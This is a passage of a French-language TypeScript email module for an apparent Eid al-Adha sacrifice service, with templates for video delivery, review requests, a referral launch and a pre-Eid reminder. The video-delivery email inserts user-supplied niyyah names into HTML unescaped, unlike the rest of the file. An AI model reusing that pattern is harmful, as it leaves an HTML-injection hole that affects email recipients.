    subject: `${esc(order.prenom)}, votre sacrifice Aïd 2026 vous attend`,
    html,
  });

  console.log("Email abandoned cart reminder sent:", result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 4 — LIVRAISON DE LA VIDÉO (ou des vidéos pour multi-mouton)
   ═══════════════════════════════════════════ */
// `videos` est une liste de signed URLs avec leur niyyah associée. Pour une
// commande single-mouton : 1 entrée. Pour multi-mouton : N entrées dans
// l'ordre des sacrifices. Affiche 1 bouton par vidéo, chacun annoté avec
// la niyyah correspondante (cohérent avec l'email de confirmation).
export async function sendVideoDelivery(
  order: Order,
  videos: Array<{ niyyah: string; url: string }>
) {
  const isMulti = videos.length > 1;
  const firstNiyyah = videos[0]?.niyyah ?? order.niyyah;

  const videoBlocks = videos
    .map((v, i) => {
      const label = isMulti
        ? `<p style="margin:0 0 8px;color:#8C8279;font-size:12px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;text-align:center;">
             ${i === 0 ? "1er" : `${i + 1}e`} sacrifice — au nom de <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;text-transform:none;letter-spacing:0;">${v.niyyah}</span>
           </p>`
        : "";
      return `${label}${goldButton(isMulti ? "VOIR CETTE VIDÉO" : "VOIR MA VIDÉO", v.url)}`;
    })
    .join('<div style="height:16px;"></div>');

  const intro = isMulti
    ? `Vos ${videos.length} sacrifices ont été accomplis dans le respect total de la Sunnah. Voici les preuves vidéos nominatives que nous vous avions promises.`
    : `Votre sacrifice au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${firstNiyyah}</strong> a été accompli dans le respect total de la Sunnah. Voici la preuve vidéo nominative que nous vous avions promise.`;

  const title = isMulti
    ? `Vos vidéos sont prêtes, ${esc(order.prenom)}`
    : `Votre vidéo est prête, ${esc(order.prenom)}`;

  const html = emailLayout(`
    <div style="text-align:center;margin:0 0 20px;">
      <span style="font-size:48px;">📹</span>
    </div>

    <h1 style="color:#1A1A18;font-size:26px;margin:0 0 8px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      ${title}
    </h1>

    <p style="text-align:center;margin:0 0 28px;color:#B8860B;font-size:15px;font-style:italic;font-family:Georgia,serif;">
      Taqabbal Allahou minna wa minkoum
    </p>

    <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
      ${intro}
    </p>

    ${videoBlocks}

    <!-- Avertissement délai -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border-left:4px solid #D4A843;border-radius:0 8px 8px 0;margin:0 0 24px;">
      <tr><td style="padding:16px 20px;">
        <p style="margin:0 0 4px;color:#8B6508;font-size:14px;font-weight:bold;">
          ⏱ ${isMulti ? "Ces liens restent" : "Ce lien reste"} valable${isMulti ? "s" : ""} 90 jours
        </p>
        <p style="margin:0;color:#5C5347;font-size:13px;line-height:1.6;">
          Pensez à télécharger ${isMulti ? "les vidéos" : "la vidéo"} sur votre téléphone ou ordinateur pour ${isMulti ? "les" : "la"} conserver durablement.
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;line-height:1.7;">
      Qu'Allah accepte ${isMulti ? "vos sacrifices" : "votre sacrifice"}.<br>
      <em style="color:#B8860B;font-family:Georgia,serif;">Aïd Moubarak de toute l'équipe Qurbaniya.</em>
    </p>
  `, order.email);

  const subject = isMulti
    ? `📹 Vos ${videos.length} vidéos de sacrifice sont prêtes — Qurbaniya`
    : `📹 Votre vidéo de sacrifice est prête — Qurbaniya`;

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject,
    html,
  });

  console.log("Email video delivery sent:", result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 6 — DEMANDE D'AVIS GOOGLE (J+3 post-vidéo)
   ═══════════════════════════════════════════ */
const GOOGLE_REVIEW_URL = "https://g.page/r/CQT3MFQZ9CcfEBM/review";

export async function sendReviewRequest(order: Order) {
  if (await isUnsubscribed(order.email)) {
    console.log("Skip review request — unsubscribed:", order.email);
    return null;
  }
  const html = emailLayout(`
    <div style="text-align:center;margin:0 0 20px;">
      <span style="font-size:48px;">⭐</span>
    </div>

    <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      Comment s'est passée votre expérience, ${esc(order.prenom)} ?
    </h1>

    <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
      Quelques jours après votre Aïd al-Adha, nous serions très reconnaissants si vous pouviez partager votre ressenti sur Google. Cela aide d'autres familles à trouver un service de confiance — et nous aide énormément à progresser.
    </p>

    ${goldButton("⭐ LAISSER UN AVIS GOOGLE", GOOGLE_REVIEW_URL)}

    <p style="margin:0 0 24px;color:#5C5347;font-size:14px;text-align:center;line-height:1.6;">
      <strong style="color:#1A1A18;">2 minutes suffisent.</strong> Que vous ayez quelque chose à dire de positif ou une critique constructive, votre avis compte.
    </p>

    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border-radius:8px;margin:0 0 24px;">
      <tr><td style="padding:16px 20px;text-align:center;">
        <p style="margin:0;color:#5C5347;font-size:13px;line-height:1.6;">
          Pas le temps pour Google ? Répondez simplement à cet email avec quelques mots — ça nous touche aussi.
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;line-height:1.7;">
      Encore merci pour votre confiance.<br>
      <em style="color:#B8860B;font-family:Georgia,serif;">L'équipe Qurbaniya.</em>
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: `⭐ Un retour rapide sur votre Aïd 2026 ? — Qurbaniya`,
    html,
    replyTo: SUPPORT_EMAIL,
  });

  console.log("Email review request sent:", result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 7 — ANNONCE DU PROGRAMME PARRAINAGE
   Broadcast one-shot envoyé aux clients existants pour leur
   communiquer leur code parrain et activer le programme.
   ═══════════════════════════════════════════ */
export async function sendReferralLaunchEmail(order: Order) {
  if (!order.referral_code) {
    throw new Error(`Order ${order.id} has no referral_code — cannot broadcast`);
  }
  if (await isUnsubscribed(order.email)) {
    console.log("Skip referral launch — unsubscribed:", order.email);
    return null;
  }
  const code = order.referral_code;
  const url = shareUrl(code);
  const waLink = `https://wa.me/?text=${encodeURIComponent(shareWhatsAppMessage(code, order.prenom))}`;

  const html = emailLayout(`
    <div style="text-align:center;margin:0 0 16px;">
      <span style="font-size:48px;">🎁</span>
    </div>

    <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      Programme parrainage lancé, ${esc(order.prenom)} !
    </h1>

    <p style="margin:0 0 28px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
      On a lancé aujourd'hui le programme parrainage Qurbaniya. En tant que client fidèle, vous avez votre propre code à partager.
    </p>

    <!-- Le code parrain -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border:2px solid #D4A843;border-radius:12px;margin:0 0 28px;">
      <tr><td style="padding:28px 24px;text-align:center;">
        <p style="margin:0 0 8px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Votre code parrain</p>
        <p style="margin:0 0 0;color:#B8860B;font-size:32px;font-weight:bold;font-family:monospace;letter-spacing:8px;">
          ${code}
        </p>
      </td></tr>
    </table>

    <!-- Mécanique -->
    <h2 style="color:#1A1A18;font-size:17px;margin:0 0 12px;font-weight:bold;font-family:Georgia,serif;">
      Comment ça marche
    </h2>
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 28px;">
      <tr><td style="padding:8px 0;">
        <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.7;">
          ✅ <strong style="color:#1A1A18;">Vos filleuls</strong> bénéficient de <strong style="color:#1B4332;">−${REFERRAL_DISCOUNT_EUR}€</strong> sur leur commande (140€ → 125€), <strong>sans limite</strong>. Plus vous partagez, plus vos proches économisent.
        </p>
      </td></tr>
      <tr><td style="padding:8px 0;">
        <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.7;">
          ✅ <strong style="color:#1A1A18;">Vous recevez ${REFERRER_REWARD_EUR}€</strong> d'avoir sur votre commande Aïd 2027 dès votre 1ᵉʳ filleul payé (crédit automatique).
        </p>
      </td></tr>
    </table>

    <!-- CTA WhatsApp -->
    <table role="presentation" cellpadding="0" cellspacing="0" style="margin:32px auto 16px;">
      <tr><td align="center" style="background:#25D366;border-radius:10px;box-shadow:0 4px 12px rgba(37,211,102,0.25);">
        <a href="${waLink}" target="_blank" style="display:inline-block;padding:16px 36px;font-family:Helvetica,Arial,sans-serif;font-size:15px;font-weight:bold;color:#FEFCF8;text-decoration:none;text-transform:uppercase;letter-spacing:1px;">
          📱 Partager sur WhatsApp
        </a>
      </td></tr>
    </table>

    <p style="margin:0 0 6px;color:#8C8279;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;text-align:center;">Ou copiez ce lien</p>
    <p style="margin:0 0 28px;text-align:center;">
      <a href="${url}" style="color:#1B4332;font-weight:bold;text-decoration:none;font-family:monospace;font-size:13px;">${url}</a>
    </p>

    <!-- Encart contexte -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border-left:4px solid #B8860B;border-radius:0 8px 8px 0;margin:0 0 24px;">
      <tr><td style="padding:16px 20px;">
        <p style="margin:0;color:#5C5347;font-size:13px;line-height:1.6;">
          L'Aïd al-Adha 2026 est dans quelques jours. Chaque sacrifice supplémentaire = une famille nourrie de plus à Madagascar. Votre partage compte.
        </p>
      </td></tr>
    </table>

    <p style="margin:0;color:#5C5347;font-size:14px;text-align:center;line-height:1.7;">
      Une question ? Répondez à cet email ou écrivez-nous sur <a href="${WHATSAPP_LINK}" style="color:#1B4332;text-decoration:none;font-weight:bold;">WhatsApp</a>.<br>
      <em style="color:#B8860B;font-family:Georgia,serif;">— L'équipe Qurbaniya</em>
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: `🎁 ${esc(order.prenom)}, votre code parrain Qurbaniya : ${code}`,
    html,
    replyTo: SUPPORT_EMAIL,
  });

  console.log("Email referral launch sent:", order.email, result.data?.id ?? "ok");
  return result;
}

/* ═══════════════════════════════════════════
   EMAIL 8 — RAPPEL J-7 (sacrifice imminent)
   ═══════════════════════════════════════════ */
export async function sendAidReminder(order: Order) {
  const intentionLabel =
    order.intention === "pour_moi" ? "pour vous-même" :
    order.intention === "famille" ? "pour votre famille" : "en sadaqa";

  // ─── Multi-mouton handling (aligné sur sendOrderConfirmation) ──────────
  // Avant ce fix, sendAidReminder ignorait quantity/sacrifices[] et envoyait
  // toujours un récap mono-mouton avec une seule niyyah, même pour les
  // commandes qty>1 — soit potentiellement plusieurs dizaines de clients
  // recevant un rappel J-X incomplet.
  const qty = order.quantity ?? 1;
  const sacrificesList =
    Array.isArray(order.sacrifices) && order.sacrifices.length > 0
      ? order.sacrifices
      : [{ niyyah: order.niyyah, intention: order.intention }];
  const intentionFr = (i: string) =>
    i === "pour_moi"
      ? "Pour vous-même"
      : i === "famille"
      ? "Pour votre famille"
      : "En sadaqa";

  const introSentence =
    qty === 1
      ? `Votre sacrifice <strong>${intentionLabel}</strong> au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong> est confirmé — référence <strong>${orderRef(order)}</strong>.`
      : `Vos <strong>${qty} sacrifices</strong> sont confirmés — référence <strong>${orderRef(order)}</strong>.`;

  const niyyahsBlock =
    qty === 1
      ? `<strong>Niyyah&nbsp;:</strong> <span style="font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</span><br>`
      : sacrificesList
          .map(
            (s, i) =>
              `<strong>${i === 0 ? "1er" : `${i + 1}e`} sacrifice&nbsp;:</strong> <span style="color:#5C5347;">${intentionFr(s.intention)}</span> · <span style="font-family:Georgia,serif;font-style:italic;color:#B8860B;font-weight:bold;">${esc(s.niyyah)}</span><br>`
          )
          .join("");

  const giftLine =
    order.is_gift && order.recipient_name
      ? `<strong>Offert à&nbsp;:</strong> 🎁 ${esc(order.recipient_name)}<br>`
      : "";

  const html = emailLayout(`
    <div style="text-align:center;margin:0 0 20px;">
      <span style="font-size:48px;">🐑</span>
    </div>

    <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
      ${esc(order.prenom)}, ${qty > 1 ? "vos sacrifices approchent" : "votre sacrifice approche"}
    </h1>

    <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
      L'Aïd al-Adha sera célébré le <strong style="color:#1A1A18;">mercredi 27 mai 2026</strong>, in sha Allah. ${introSentence}
    </p>

    <!-- Récap commande -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#F7F3ED;border:1px solid #EFE9DF;border-radius:12px;margin:0 0 28px;">
      <tr><td style="padding:20px 24px;">
        <p style="margin:0 0 6px;color:#B8860B;font-size:11px;font-weight:bold;text-transform:uppercase;letter-spacing:1.5px;">Récapitulatif</p>
        <p style="margin:0;color:#1A1A18;font-size:14px;line-height:1.8;">
          <strong>Référence&nbsp;:</strong> ${orderRef(order)}<br>
          ${qty > 1 ? `<strong>Nombre de moutons&nbsp;:</strong> ${qty}<br>` : ""}
          ${niyyahsBlock}
          ${giftLine}
          <strong>Date du sacrifice&nbsp;:</strong> mercredi 27 mai 2026
        </p>
      </td></tr>
    </table>

    <!-- Action WhatsApp -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#E8F0EB;border-left:4px solid #2D6A4F;border-radius:0 8px 8px 0;margin:0 0 24px;">
      <tr><td style="padding:20px 22px;">
        <p style="margin:0 0 8px;color:#1B4332;font-size:15px;font-weight:bold;">
          📱 Confirmez votre numéro WhatsApp
        </p>
        <p style="margin:0 0 4px;color:#1B4332;font-size:13px;line-height:1.6;">
          La vidéo nominative de votre sacrifice vous sera envoyée par WhatsApp dans les 24h après le 27 mai. Vérifiez que votre numéro est correct&nbsp;:
        </p>
        <p style="margin:8px 0 0;color:#1A1A18;font-size:15px;font-weight:bold;font-family:monospace;">
          ${order.telephone || "—"}
        </p>
        <p style="margin:8px 0 0;color:#1B4332;font-size:12px;line-height:1.6;">
          Si ce numéro est incorrect ou si vous préférez un autre, répondez simplement à cet email avec le bon numéro.
        </p>
      </td></tr>
    </table>

    <!-- Étapes restantes -->
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px;">
      ${stepItem("1", "Jour de l'Aïd — 27 mai", qty > 1 ? `Le cheikh effectue ${qty > 1 ? `vos ${qty} sacrifices` : "votre sacrifice"} en votre nom, dans le respect total de la Sunnah.` : "Le cheikh effectue le sacrifice en votre nom, dans le respect total de la Sunnah.")}
      ${stepItem("2", qty > 1 ? "Vidéos nominatives" : "Vidéo nominative", qty > 1 ? `Vous recevez vos ${qty} vidéos par WhatsApp dans les 48h qui suivent. Aucune action à faire de votre côté.` : "Vous la recevez par WhatsApp dans les 24h qui suivent. Aucune action à faire de votre côté.")}
    </table>

    <p style="margin:24px 0 0;color:#5C5347;font-size:14px;line-height:1.6;text-align:center;">
      Pour toute question&nbsp;:
      <a href="mailto:${SUPPORT_EMAIL}" style="color:#1B4332;font-weight:bold;text-decoration:none;">${SUPPORT_EMAIL}</a>
      <span style="color:#8C8279;">&nbsp;·&nbsp;</span>
      <a href="${WHATSAPP_LINK}" style="color:#1B4332;font-weight:bold;text-decoration:none;">WhatsApp</a>
    </p>

    <p style="margin:24px 0 0;color:#B8860B;font-size:14px;font-style:italic;text-align:center;font-family:Georgia,serif;">
      Qu'Allah accepte ${qty > 1 ? "vos sacrifices" : "votre sacrifice"}.
    </p>
  `, order.email);

  const result = await getResend().emails.send({
    from: FROM,
    to: order.email,
    headers: unsubscribeHeaders(order.email),
    subject: qty > 1
      ? `🐑 ${esc(order.prenom)}, vos ${qty} sacrifices du 27 mai approchent`
      : `🐑 ${esc(order.prenom)}, votre sacrifice du 27 mai approche`,
    html,
    replyTo: SUPPORT_EMAIL,
  });

  console.log("Email aid reminder sent:", order.email, result.data?.id ?? "ok");
  return result;
}
